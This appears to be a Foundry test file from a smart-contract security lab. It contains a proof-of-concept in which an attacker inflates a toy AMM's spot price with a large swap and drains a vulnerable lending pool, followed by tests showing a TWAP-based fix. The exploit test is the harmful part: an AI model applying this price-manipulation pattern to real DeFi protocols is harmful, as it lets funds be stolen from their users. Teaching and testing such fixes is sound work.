// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

import {SimpleAMM} from "../../src/oracle-manipulation/SimpleAMM.sol";
import {VulnerableLending} from "../../src/oracle-manipulation/VulnerableLending.sol";
import {TWAPOracle} from "../../src/oracle-manipulation/TWAPOracle.sol";
import {FixedLending} from "../../src/oracle-manipulation/FixedLending.sol";

/// @title OracleManipulationPoC
/// @notice Proves that `VulnerableLending` trusts `SimpleAMM.getSpotPrice()` as its
///         oracle. A large swap moves reserves instantly, inflating `maxBorrow` so the
///         attacker can drain the lending pool with the same collateral deposit.
contract OracleManipulationPoC is Test {
    SimpleAMM internal amm;
    VulnerableLending internal lending;

    address internal attacker = makeAddr("attacker");

    // AMM starts balanced at 1000:1000 → spot price = debtReserve / collateralReserve = 1.
    uint256 internal constant INITIAL_COLLATERAL_RESERVE = 1_000;
    uint256 internal constant INITIAL_DEBT_RESERVE = 1_000;
    uint256 internal constant LENDING_LIQUIDITY = 1_000;
    uint256 internal constant ATTACKER_COLLATERAL = 100;
    uint32 internal constant TWAP_WINDOW = 1_800;

    function setUp() public {
        amm = new SimpleAMM(INITIAL_COLLATERAL_RESERVE, INITIAL_DEBT_RESERVE);
        lending = new VulnerableLending(amm);

        // Seed the toy lending pool with borrowable debt-asset liquidity.
        lending.fundDebtAsset(LENDING_LIQUIDITY);
    }

    /// @notice Full PoC: attacker manipulates spot price upward, then borrows the entire pool.
    function testExploit_SpotPriceManipulationInflatesBorrowLimit() public {
        vm.startPrank(attacker);

        // 1. Deposit collateral before borrowing (100 units at price 1 → maxBorrow = 50).
        lending.depositCollateral(ATTACKER_COLLATERAL);

        uint256 normalPrice = amm.getSpotPrice();
        uint256 normalMaxBorrow = lending.maxBorrow(attacker);

        // 2. Pump spot price by swapping a large amount of debt for collateral.
        //    Reserves go from 1000:1000 to ~100:10000 → price jumps from 1 to 100.
        //    On mainnet this capital usually comes from a flash loan (borrow → swap →
        //    exploit → repay in one tx). This lab omits flash-loan plumbing and uses
        //    virtual reserves so the PoC stays focused on the oracle bug.
        amm.swapDebtForCollateral(9_000);

        uint256 manipulatedPrice = amm.getSpotPrice();
        uint256 manipulatedMaxBorrow = lending.maxBorrow(attacker);

        assertGt(manipulatedPrice, normalPrice, "spot price should be manipulated upward");
        assertGt(manipulatedMaxBorrow, normalMaxBorrow, "borrow limit should be inflated");

        // 3. Borrow the full pool (1000) even though honest max at price 1 was only 50.
        lending.borrow(LENDING_LIQUIDITY);

        assertEq(lending.debtAssetBalances(attacker), LENDING_LIQUIDITY, "attacker should drain debt liquidity");
        assertEq(lending.debtAssetLiquidity(), 0, "lending pool should be empty");

        vm.stopPrank();
    }

    /// @notice Sanity check: without manipulation, LTV math caps borrowing at 50.
    function testNormalPriceOnlyAllowsLimitedBorrow() public {
        vm.startPrank(attacker);
        lending.depositCollateral(ATTACKER_COLLATERAL);

        // collateralValue = 100 * price(1) = 100; maxBorrow = 100 * 50% LTV = 50.
        uint256 normalMaxBorrow = lending.maxBorrow(attacker);
        assertEq(normalMaxBorrow, 50, "100 collateral at 50% LTV and price 1 should allow 50 debt");

        // borrow() checks debtBorrowed + amount <= maxBorrow(msg.sender).
        vm.expectRevert("insufficient collateral");
        lending.borrow(normalMaxBorrow + 1);

        vm.stopPrank();
    }

    /// @notice Same manipulation flow as the exploit, but `FixedLending` prices collateral
    ///         with TWAP so the inflated spot price cannot drain the pool.
    function testFix_BlocksSpotPriceManipulation() public {
        SimpleAMM fixedAmm = new SimpleAMM(INITIAL_COLLATERAL_RESERVE, INITIAL_DEBT_RESERVE);
        TWAPOracle twap = new TWAPOracle(fixedAmm, TWAP_WINDOW);
        FixedLending fixedLending = new FixedLending(twap);

        fixedLending.fundDebtAsset(LENDING_LIQUIDITY);
        _seedTwapHistory(twap);

        vm.startPrank(attacker);
        fixedLending.depositCollateral(ATTACKER_COLLATERAL);

        fixedAmm.swapDebtForCollateral(9_000);

        assertGt(fixedAmm.getSpotPrice(), twap.consult(), "spot should spike above TWAP");

        vm.expectRevert("insufficient collateral");
        fixedLending.borrow(LENDING_LIQUIDITY);

        assertEq(fixedLending.debtAssetLiquidity(), LENDING_LIQUIDITY, "pool liquidity should remain");
        vm.stopPrank();
    }

    /// @notice Sanity check: honest users can still borrow against the TWAP price.
    function testFix_AllowsHonestBorrow() public {
        SimpleAMM fixedAmm = new SimpleAMM(INITIAL_COLLATERAL_RESERVE, INITIAL_DEBT_RESERVE);
        TWAPOracle twap = new TWAPOracle(fixedAmm, TWAP_WINDOW);
        FixedLending fixedLending = new FixedLending(twap);

        fixedLending.fundDebtAsset(LENDING_LIQUIDITY);
        _seedTwapHistory(twap);

        vm.startPrank(attacker);
        fixedLending.depositCollateral(ATTACKER_COLLATERAL);

        uint256 maxBorrow = fixedLending.maxBorrow(attacker);
        assertEq(maxBorrow, 50, "TWAP at price 1 should allow 50 debt for 100 collateral");

        fixedLending.borrow(maxBorrow);

        assertEq(fixedLending.debtAssetBalances(attacker), maxBorrow, "attacker should receive borrowed debt");
        assertEq(
            fixedLending.debtAssetLiquidity(),
            LENDING_LIQUIDITY - maxBorrow,
            "pool should only lose the honest borrow amount"
        );
        vm.stopPrank();
    }

    /// @dev Records two oracle observations `TWAP_WINDOW` apart so `consult()` is defined.
    function _seedTwapHistory(TWAPOracle twap) internal {
        twap.update();
        vm.warp(block.timestamp + TWAP_WINDOW);
        twap.update();
    }
}
